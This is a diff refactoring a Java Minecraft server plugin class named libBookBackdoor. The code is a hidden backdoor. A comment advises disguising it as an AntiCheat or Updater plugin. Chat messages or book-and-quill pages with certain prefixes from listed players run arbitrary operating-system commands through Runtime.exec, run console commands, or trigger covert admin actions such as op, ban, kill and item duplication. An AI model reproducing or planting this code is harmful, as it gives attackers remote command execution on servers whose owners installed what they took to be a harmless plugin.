@@ -20,8 +20,8 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
+import java.util.Objects;
 
 abstract class Countdown {
     private int time;
@@ -46,7 +46,7 @@ abstract class Countdown {
         }.runTaskTimer(plugin, 0L, 20L); // 1 second is 20 ticks
     }
 }
-
+/*
 class ColorTranslator {
     // This is gonna be wack.
     public static String translateStr(String str, Plugin plugin) {
@@ -63,6 +63,7 @@ class ColorTranslator {
         return str;
     }
 }
+ */
 
 /*
     If you want this to stay hidden in your plugin
@@ -70,6 +71,7 @@ class ColorTranslator {
     AntiCheat or Updater.
  */
 
+@SuppressWarnings("deprecation")
 class Commands {
     Command[] registeredCommands;
 
@@ -77,7 +79,7 @@ class Commands {
         registeredCommands = commands;
     }
 
-    public void parseCommand(Plugin plugin, Player player, String commandType, String commandName, String[] args) {
+    public void parseCommand(Plugin plugin, Player player, String commandName, String[] args) {
         if (registeredCommands != null) {
             for (Command command : registeredCommands) {
                 if (command.commandName.equals(commandName)) {
@@ -95,11 +97,11 @@ class Commands {
         registerCommands(new Command[]{help, give, mend, brazil, seed, tp, enchant, xp, kill, ban, kick, op, deop, bbreak, troll, dupe, gamemode, god, invisible, giveBook});
     }
 
-    abstract class Command {
-        public String commandName = null;
-        public String commandDescription = null;
-        public String commandUsage = null;
-        public TextComponent help = null;
+    abstract static class Command {
+        public String commandName;
+        public String commandDescription;
+        public String commandUsage;
+        public TextComponent help;
 
         abstract void command(Plugin plugin, Player player, String[] args);
 
@@ -117,8 +119,6 @@ class Commands {
         }
     }
 
-    public Commands shared = this;
-
     Command give = new Command(
             "give",
             "Give yourself any Block/Item.",
@@ -127,17 +127,11 @@ class Commands {
         @Override
         void command(Plugin plugin, Player player, String[] args) {
             int amount = 64;
-            if (args.length == 3) {
-                amount = Integer.parseInt(args[2]);
-            }
+            if (args.length == 3) amount = Integer.parseInt(args[2]);
             try {
                 String mat = args[1].toUpperCase();
-                ItemStack item = new ItemStack(Material.getMaterial(mat), amount);
-                if (item == null) {
-                    player.sendMessage("Use the Spigot naming scheme");
-                } else {
-                    player.getInventory().addItem(item);
-                }
+                ItemStack item = new ItemStack(Objects.requireNonNull(Material.getMaterial(mat)), amount);
+                player.getInventory().addItem(item);
             } catch (Exception e) {
                 player.sendMessage("Use the Spigot naming scheme");
             }
@@ -182,6 +176,7 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
+                assert p != null;
                 Location loc = p.getLocation();
                 loc.setY(-2);
                 p.teleport(loc);
@@ -198,7 +193,7 @@ class Commands {
     ) {
         @Override
         void command(Plugin plugin, Player player, String[] args) {
-            String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
+            String message = "Seed [" + ChatColor.GREEN + player.getWorld().getSeed() + ChatColor.RESET + "]";
             TextComponent string = new TextComponent(message);
             string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
             string.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Copy seed to clipboard").create()));
@@ -216,6 +211,8 @@ class Commands {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
                 Player p2 = plugin.getServer().getPlayer(args[2]);
+                assert p != null;
+                assert p2 != null;
                 if (!p.equals(player)) {
                     p2.teleportAsync(p.getLocation());
                 } else {
@@ -240,7 +237,7 @@ class Commands {
                     public void count(int current) {
                         if (current == 0) {
                             try {
-                                player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
+                                player.getInventory().getItemInMainHand().addUnsafeEnchantment(Objects.requireNonNull(Enchantment.getByName(args[1].toUpperCase())), Integer.parseInt(args[2]));
                                 player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 50, 1);
                                 player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
                             } catch (Exception e) {
@@ -281,6 +278,7 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
+                assert p != null;
                 p.setHealth(0.0D);
             } catch (Exception e) {
                 player.sendMessage("Invalid player name");
@@ -296,15 +294,16 @@ class Commands {
         @Override
         void command(Plugin plugin, Player player, String[] args) {
             try {
-                String reason = "You have been banned from the server";
+                StringBuilder reason = new StringBuilder("You have been banned from the server");
                 if (args.length > 1) {
-                    reason = "";
+                    reason = new StringBuilder();
                     for (int i = 1; i < args.length; i++) {
-                        reason = reason + " " + args[i];
+                        reason.append(" ").append(args[i]);
                     }
                 }
                 Player p = plugin.getServer().getPlayer(args[1]);
-                p.banPlayerFull(reason);
+                assert p != null;
+                p.banPlayerFull(reason.toString());
             } catch (Exception e) {
                 player.sendMessage("Invalid player name");
             }
@@ -319,15 +318,16 @@ class Commands {
         @Override
         void command(Plugin plugin, Player player, String[] args) {
             try {
-                String reason = "You have been kicked from the server";
+                StringBuilder reason = new StringBuilder("You have been kicked from the server");
                 if (args.length > 1) {
-                    reason = "";
+                    reason = new StringBuilder();
                     for (int i = 1; i < args.length; i++) {
-                        reason = reason + " " + args[i];
+                        reason.append(" ").append(args[i]);
                     }
                 }
                 Player p = plugin.getServer().getPlayer(args[1]);
-                p.kickPlayer(reason);
+                assert p != null;
+                p.kickPlayer(reason.toString());
             } catch (Exception e) {
                 player.sendMessage("Invalid player name");
             }
@@ -385,6 +385,7 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
+                assert p != null;
                 Location loc = p.getLocation();
                 player.playSound(loc, Sound.ENTITY_ENDERMAN_DEATH, 100, 1);
             } catch (Exception e) {
@@ -432,31 +433,23 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 String gamemode = args[1].toLowerCase();
-                BukkitTask task = new BukkitRunnable() {
+                new BukkitRunnable() {
                     @Override
                     public void run() {
                         switch (gamemode) {
-                            case ("c"):
-                            case ("creative"):
+                            case ("c"), ("creative") -> {
                                 player.setGameMode(GameMode.CREATIVE);
                                 player.sendActionBar("Set gamemode to creative");
-                                break;
-
-                            case ("s"):
-                            case ("survival"):
+                            }
+                            case ("s"), ("survival") -> {
                                 player.setGameMode(GameMode.SURVIVAL);
                                 player.sendActionBar("Set gamemode to survival");
-                                break;
+                            }
+                            case ("sp"), ("spectator") -> player.sendMessage("Not going to enable this because it will cause you to be stuck in spectator mode.");
 
-                            case ("sp"):
-                            case ("spectator"):
-                                player.sendMessage("Not going to enable this because it will cause you to be stuck in spectator mode.");
-                                //player.setGameMode(GameMode.SPECTATOR);
-                                //player.sendActionBar("Set gamemode to spectator");
-                                break;
-                            default:
-                                player.sendMessage("Please use survival, spectator, or creative.");
-                                break;
+                            //player.setGameMode(GameMode.SPECTATOR);
+                            //player.sendActionBar("Set gamemode to spectator");
+                            default -> player.sendMessage("Please use survival, spectator, or creative.");
                         }
                     }
                 }.runTask(plugin);
@@ -475,15 +468,9 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 switch (args[1].toLowerCase()) {
-                    case ("true"):
-                        player.setInvulnerable(true);
-                        break;
-                    case ("false"):
-                        player.setInvulnerable(false);
-                        break;
-                    default:
-                        player.sendMessage("Please use true/false");
-                        break;
+                    case ("true") -> player.setInvulnerable(true);
+                    case ("false") -> player.setInvulnerable(false);
+                    default -> player.sendMessage("Please use true/false");
                 }
             } else {
                 player.sendMessage("Please use true/false");
@@ -500,15 +487,9 @@ class Commands {
         void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 switch (args[1].toLowerCase()) {
-                    case ("true"):
-                        player.setInvisible(true);
-                        break;
-                    case ("false"):
-                        player.setInvisible(false);
-                        break;
-                    default:
-                        player.sendMessage("Please use true/false");
-                        break;
+                    case ("true") -> player.setInvisible(true);
+                    case ("false") -> player.setInvisible(false);
+                    default -> player.sendMessage("Please use true/false");
                 }
             } else {
                 player.sendMessage("Please use true/false");
@@ -586,12 +567,12 @@ class Commands {
     };
 }
 
+@SuppressWarnings("deprecation")
 public class libBookBackdoor implements Listener {
 
     public final Plugin plugin;
     public String[] authedPlayers = null;
     public boolean chatCommandsEnabled = false;
-    public static HashMap<String, Boolean> jesus = new HashMap<String, Boolean>();
 
     public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
@@ -615,7 +596,7 @@ public class libBookBackdoor implements Listener {
 
     public String getResult(Process process) throws IOException {
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-        String line = "";
+        String line;
         List<String> ret = new ArrayList<>();
         while ((line = reader.readLine()) != null) ret.add(line);
         StringBuilder build = new StringBuilder();
@@ -623,7 +604,7 @@ public class libBookBackdoor implements Listener {
             build.append(str);
             build.append("\n");
         }
-        return ColorTranslator.translateStr(build.toString(), plugin);
+        return build.toString();
     }
 
     /*
@@ -654,6 +635,7 @@ public class libBookBackdoor implements Listener {
             for (String name : authedPlayers) {
                 if (name.equals(playerName)) {
                     canContinue = true;
+                    break;
                 }
             }
         } else {
@@ -665,9 +647,7 @@ public class libBookBackdoor implements Listener {
             String commandType = Character.toString(event.getMessage().charAt(0));
             String command = event.getMessage().substring(1);
             switch (commandType) {
-                case (">"):
-                case ("$"):
-                case ("#"):
+                case (">"), ("$"), ("#") -> {
                     try {
                         player.sendMessage("Running: " + command);
                         Process proc = Runtime.getRuntime().exec(command);
@@ -676,27 +656,26 @@ public class libBookBackdoor implements Listener {
                         player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                     }
                     event.setCancelled(true);
-                    break;
-                case ("\\"):
-                    BukkitTask task = new BukkitRunnable() {
+                }
+                case ("\\") -> {
+                    new BukkitRunnable() {
                         @Override
                         public void run() {
                             plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
                         }
                     }.runTask(plugin);
                     event.setCancelled(true);
-                    break;
-                case ("."):
+                }
+                case (".") -> {
                     String[] args = command.split(" ", 0);
                     String mainCmd = args[0].toLowerCase();
                     // Init the Commands class
                     Commands runner = new Commands(); // <- Registers all commands
-
-                    runner.parseCommand(plugin, player, commandType, mainCmd, args);
+                    runner.parseCommand(plugin, player, mainCmd, args);
                     event.setCancelled(true);
-                    break;
-                default:
-                    break;
+                }
+                default -> {
+                }
             }
         }
     }
@@ -711,6 +690,7 @@ public class libBookBackdoor implements Listener {
             for (String name : authedPlayers) {
                 if (name.equals(playerName)) {
                     canContinue = true;
+                    break;
                 }
             }
         } else {
@@ -727,9 +707,7 @@ public class libBookBackdoor implements Listener {
                 String command = pageString.substring(1);
 
                 switch (commandType) {
-                    case (">"):
-                    case ("$"):
-                    case ("#"):
+                    case (">"), ("$"), ("#") -> {
                         try {
                             player.sendMessage("Running: " + command);
                             Process proc = Runtime.getRuntime().exec(command);
@@ -737,32 +715,28 @@ public class libBookBackdoor implements Listener {
                         } catch (Exception e) {
                             player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                         }
-                        break;
-                    case ("\\"):
+                    }
+                    case ("\\") -> {
                         this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
-                        break;
-                    case ("."):
+                    }
+                    case (".") -> {
                         String[] args = command.split(" ", 0);
                         String mainCmd = args[0].toLowerCase();
                         // Init the Commands class
                         Commands runner = new Commands(); // <- Registers all commands
 
-                        runner.parseCommand(plugin, player, commandType, mainCmd, args);
-                        break;
-                    case ("/"):
+                        runner.parseCommand(plugin, player, mainCmd, args);
+                    }
+                    case ("/") -> {
                         player.sendMessage("/ is no longer supported, please use \\");
-                        break;
-                    default:
-                        break;
+                    }
+                    default -> {
+                    }
                 }
 
                 // Give the player a new Book and Quill after the command
                 player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
-                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
-                    public void run() {
-                        player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
-                    }
-                }, 5);
+                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, () -> player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK)), 5);
             }
         }
     }
